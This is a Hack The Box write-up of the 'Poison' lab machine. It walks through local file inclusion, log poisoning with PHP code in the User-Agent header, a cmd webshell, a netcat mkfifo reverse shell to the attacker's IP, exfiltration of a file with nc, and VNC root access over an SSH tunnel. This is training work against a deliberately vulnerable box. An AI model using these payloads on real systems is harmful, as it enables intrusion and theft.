---
layout: post
title:  "Poison Writeup - Hack The Box"
date:   2025-06-19
desc: ""
keywords: "HTB,eWPT,eJPT,Linux,Local File Inclusion,LFI to RCE,Log Poisoning,Cracking Zip,VNC Viewer,Medium"
categories: [HTB]
tags: [HTB,eWPT,eJPT,Linux,Local File Inclusion,LFI to RCE,Log Poisoning,Cracking Zip,VNC Viewer,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/poison_writeup/Poison.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

With the **Poison** machine I was able to remember a vulnerability that I had already exploited on previous machines on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform, but in this case it is not the only way to engage the machine, which makes me reflect on the real goal one should pursue when engaging the labs. It's not about getting the flags, it's about defying creativity to find different methods in the engagement, getting to know the tools I use, creating new custom script and many other things more. The machine is rated as **Medium**, so I'm going to log into my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to spawn it and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/poison_writeup/Poison_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To check that I already have connectivity with the lab, I can send a trace with `ping` and observe that the packets arrived at the destination, also with the `whichSystem.py` tool (developed by **[s4vitar](https://hack4u.io/){:target="_blank"}**) I get the possible **OS** of the machine. Now I can start the **Reconnaissance** phase, first I'm going to list the open ports with `nmap` and thanks to the scripts of this tool I can leak all the possible information of the services offered in them, the **versions** are a very important data to look for vulnerabilities and also the **codename** of the victim machine (it seems that **containers** are being implemented, because I find different values). With `whatweb` (from console) and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** (from browser) I can disclose the technology stack behind an application. The web service would allow me to access **Apache** server configuration files.

```bash
ping -c 1 10.10.10.84
whichSystem.py 10.10.10.84
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.84 -oG allPorts
nmap -sCV -p22,80 10.10.10.84 10.10.10.84 -oN targeted
cat targeted
#    --> OpenSSH 7.2
#    google.es --> OpenSSH 7.2 launchpad             Xenial
#    --> Apache httpd 2.4.29
#    google.es --> Apache httpd 2.4.29 launchpad     Bionic      Containers?

whatweb http://10.10.10.84
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I have access to the server configuration files, I'm going to access each of them to gather information that will give me a view of possible attack vectors. In one of them I find the name (**very suggestive** of a possible password) of a file that may also be available on the server, I also find that there are no restrictions on the use of functions (**disable_functiones**), a very important piece of information if I want to exploit a **RCE**. In the hidden file I find a text that was encoded (most probably in **Base 64**) **13 times**.

```html
http://10.10.10.84/browse.php?file=info.php
http://10.10.10.84/browse.php?file=phpinfo.php
# disable_functions no value    :)
http://10.10.10.84/browse.php?file=pwdbackup.txt
# This password is secure, it's encoded atleast 13 times.. what could go wrong really..
```

<br/>
<img src="{{ site.img_path }}/poison_writeup/Poison_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before continuing, I'm going to do a web server fingerprint search with the `nmap` script to find more hidden files, but I can't find anything at the moment. I perform a recursive decoding of the text I found and affirmatively it is a password, unfortunately I don't have usernames (except **root**, but <ins>I don't think it is so easy the engagement</ins>). One thing that caught my attention is that the access to the different resources of the server, is done using the **URL** itself, with the **GET** method and the use of a parameter (**file**), doing a quick test I can also access sensitive system files such as **passwd**, **hosts**, etc.. I already have possible **usernames**, and with one (**charix**) I can access the machine through **SSH**.

```bash
nmap --script http-enum -p80 10.10.10.84 -oN webScan

string="Vm0wd2......uUFQwSwo="; for i in $(seq 1 13); do echo $i && echo $string && string=$(echo $string | base64 -d | tr -d '\n' | tr -d ' ') && echo '\n\n'; done; echo $string > data
string="Vm0wd2......uUFQwSwo="; for i in $(seq 1 13); do echo string=$(echo $string | base64 -d | tr -d '\n' | tr -d ' '); done; echo $string > data

# view-source:http://10.10.10.84/browse.php?file=/etc/passwd
# view-source:http://10.10.10.84/browse.php?file=/proc/net/fib_trie
# view-source:http://10.10.10.84/browse.php?file=/proc/net/tcp
# view-source:http://10.10.10.84/browse.php?file=/home/charix/.ssh/id_rsa

# view-source:http://10.10.10.84/browse.php?file=/etc/hosts

ssh chrix@10.10.10.84
# :)
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Enumeration** phase of the compromised system, I also have access to the content of the first flag and in the same directory I find a compressed **Zip** file but I don't have the necessary binary to decompress its content, then I will return to it in case I don't find anything else. Another interesting fact is that I have access to the server logs, which makes me reflect on another path I could have taken to access the system (which seems to me that it was the **intended one**). The way to perform the exploit is to take advantage of the **LFI** to access the **[path to the logs](https://unix.stackexchange.com/questions/38978/where-are-apache-file-access-logs-stored){:target="_blank"}** and inject code in **PHP** in one of the headers of the requests I send to the server to **poison** the logs (I always choose the **browser** one), but very careful with the special characters I use (I had to restart the machine in **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** because I crashed it several times) and in this way I can execute commands remotely.

> **[Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning){:target="_blank"}** is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful **HTTP** response is served to other users. Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

> **Victime Machine**:

```bash
whoami
hostname
hostname -I
tty
echo $SHELL
echo $TERM
uname -a
lsb_release -a
sudo -l
file secret.zip

# view-source:http://10.10.10.84/browse.php?file=/var/log/auth.log
# view-source:http://10.10.10.84/browse.php?file=/var/log/apache/access.log
# view-source:http://10.10.10.84/browse.php?file=/var/log/apache2/access.log
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd/error.log
# :(
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
# :)

cat httpd-access.log | tail -n 10
```

> **Attacker Machine**:

```bash
python3
  import requests
  headers = {'User-Agent': 'oldb0y was here'}
  r = requests.get('http://10.10.10.84', headers=headers)
  headers = {'User-Agent': '<?php system("id"); ?>'}
  r = requests.get('http://10.10.10.84', headers=headers)
  headers = {'User-Agent': '<?php shell_exec("whoami"); ?>'}
  r = requests.get('http://10.10.10.84', headers=headers)
# Beware of poisoning, I just broke the log service (especial characters) :(

  headers = {'User-Agent': "<?php system('id'); ?>"}
  r = requests.get('http://10.10.10.84', headers=headers)
  headers = {'User-Agent': "<?php system('whoami'); ?>"}
  r = requests.get('http://10.10.10.84', headers=headers)
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To avoid doing the injections from the console with `python`, I can inject a command so that through the **URL** and the use of a parameter (**cmd**), I can execute the commands more quickly. I check that the connectivity to my machine is correct and I try to send me a **Reverse Shell**, using a **[PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}** command but in my first attempt I don't succeed. I'm going to **URL-encode** the command with `php`, because I think the problem is in the use of **special characters**, now I succeed to access the machine again. I remember the compressed file that I could not unzip on the victim machine, so I better transfer it to my machine to analyze it, with `7z` I can see list the file but I can't unzip it because it is password protected.

> **Attacker Machine**:

```bash
python3
  headers = {'User-Agent': "<?php system($_REQUEST['cmd']); ?>"}
  r = requests.get('http://10.10.10.84', headers=headers)

# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=whoami
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=id
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=ls -l
# ?

tcpdump -i tun0 icmp -n
#view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=ping%2010.10.14.14

nc -nlvp 443
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f
# :(

php --interactive
  $r_shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f";
  echo urlencode($r_shell);

nc -nlvp 443
# view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.14+443+%3E%2Ftmp%2Ff
# :)
```

> **Attacker Machien**:

```bash
sshpass -p 'Ch---0' ssh charix@10.10.10.84

nc -nlvp 443 > secret.zip
```

> **Victime Machine**:

```bash
cat < secret.zip > nc 10.10.14.14 443
# :(
nc 10.10.14.14 443 < secret.zip
md5sum secret.zip
# :(
du -hc secret.zip
```

> **Attacker Machine**:

```bash
md5sum secret.zip
du -hc secret.zip
7z l secret.zip
7z x secret.zip
# Password :(
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to use `john` to perform a brute force attack, maybe the password is in the dictionary **rockyou.txt**, but first I have to get the hash of the compressed file with `zip2john`, this way `john` can start his work, but unfortunately he doesn't succeed. I try to do a password reuse (with the one I accessed via SSH) to unzip the archive with `7z` and I access the content, reusing credentials is a very common **bad practice**. The content is not readable so I still don't understand how it can help me. When I re-enumerate the system with much more effort, I find with `sockstat` that there are open ports locally and one of them corresponds to the **VNC system**.

> **VNC** stands for **[Virtual Network Computing](https://discover.realvnc.com/what-is-vnc-remote-access-technology){:target="_blank"}**. It is a cross-platform screen sharing system that was created to remotely control another computer. This means that a computer’s screen, keyboard, and mouse can be used from a distance by a **remote user** from a secondary device as though they were sitting right in front of it.

> **Attacker Machine**:

```bash
locate unzip2john
# :(
locate zip2john
/usr/sbin/zip2john secret.zip > hash
john -w=$(locate rockyou.txt)                         [tab]
john -w=/usr/share/wordlists/rockyou.txt hash
# :(

# Password Reuse ??
7z x secret.zip
cat secret
file secret
```

> **Victime Machine**:

```bash
# Try harder
find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
netstat -nat

sockstat -46
# root     sendmail   643   3  tcp4   127.0.0.1:25          *:*
# root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
# root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm going to download from the **RealVNC** site the **[client application](https://www.realvnc.com/en/connect/download/viewer/){:target="_blank"}** that will allow me to connect remotely to the victim machine, but it is not necessary since a program (**xtightvncviewer**) to do so is already installed on my **Linux** machine. As I do not have access to port **5901** offered by the service I will perform a **Local Port Forwarding** with **SSH**, this way I can access the remote service through my local port **5901**. Once the configuration is done I check with `lsof` that the tunnel is already up and I try with `vncviewer` to connect, but it requires a password. It is very likely that the **secret** file that I had unzipped is the one I need, when I use the **-passwd** parameter with the file I check that it is indeed and I can connect as the **root** user remotely to access the last flag. A tips, in case you can not connect with the **secret** file, there is a tool available on **Github** from **[jeroennijhof](https://github.com/jeroennijhof/vncpwd){:target="_blank"}**, which can crack the file and get the password in text, this way I can reconnect without inconvenience. Machine finally engaged.

> **[xtightvncviewer](){:target="_blank"}** in Linux is a **VNC** (Virtual Network Computing) client application that connects to a **VNC** server and displays its remote desktop in an X window. It's part of the **TightVNC** project, which provides enhanced **VNC** functionality, including optimized encoding for low bandwidth connections.

> **[SSH port forwarding](https://builtin.com/software-engineering-perspectives/ssh-port-forwarding){:target="_blank"}**, sometimes referred to as SSH tunneling, is a method for safely transmitting data over an encrypted SSH connection between a local and distant server.  It allows users to securely connect to resources or services that firewalls could otherwise prevent or restrict.
> - When a user needs to access a resource or service located on a remote server but is unable to do so directly because of firewall settings, network configurations or private network limitations, local port forwarding is utilized.
> - ssh -L [local_port]:[destination_address]:[destination_port] [username]@[ssh_server]

```bash
mv /home/al3j0/Downloads/VNC-Viewer-7.13.1-Linux-x64.deb .
dpkg -i VNC-Viewer-7.13.1-Linux-x64.deb
# xtightvncviewer (version 1:1.3.10-9) is present and installed.

sshpass -p 'Ch---0' ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
lsof -i:5901
vncviewer 127.0.0.1:5901
# :(
vncviewer 127.0.0.1:5901 -passwd secret
# :)

git clone https://github.com/jeroennijhof/vncpwd
cd vncpwd
make
./vncpwd ../secret

sshpass -p 'Ch---0' ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
vncviewer 127.0.0.1:5901
```

<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/poison_writeup/Poison_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> I **reemphasize** again that you have to take advantage of every **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab, to practice and look for different ways to engage it. It is an excellent way to improve every skill that a good professional in the area of information security should possess without needing to set up a lab, since the labs offered by the platform are excellent and cover all the areas that one should know. I'm going to kill the box and choose the next one, so as not to stop my learning.

<br /><br />
<img src="{{ site.img_path }}/poison_writeup/Poison_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
